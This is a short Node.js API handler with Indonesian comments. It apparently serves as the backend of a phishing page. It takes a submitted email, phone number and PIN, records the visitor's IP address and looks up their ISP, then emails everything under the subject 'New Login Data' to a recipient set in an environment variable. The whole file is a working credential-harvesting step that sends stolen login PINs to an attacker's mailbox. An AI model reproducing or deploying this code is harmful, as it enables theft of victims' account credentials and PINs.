import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  try {
    const { email, phone, pin } = req.body;

    // ambil IP dari header (di Vercel/hosting biasanya pakai x-forwarded-for)
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "Unknown";

    // ambil info ISP via API publik
    let isp = "Unknown";
    try {
      const resp = await fetch(`http://ip-api.com/json/${ip}?fields=isp`);
      const data = await resp.json();
      if (data?.isp) isp = data.isp;
    } catch (err) {
      console.error("Gagal ambil ISP:", err);
    }

    // setup email transporter
    const transporter = nodemailer.createTransport({
      service: "gmail", // atau SMTP lain
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // susun isi pesan
    let message = "";
    if (email) message += `Email: ${email}\n`;
    if (phone) message += `Phone: ${phone}\n`;
    if (pin) message += `PIN: ${pin}\n`;
    message += `\nIP: ${ip}\nISP: ${isp}`;

    await transporter.sendMail({
      from: `"Notifier" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_TO,
      subject: "New Login Data",
      text: message,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error in sendmail:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
}
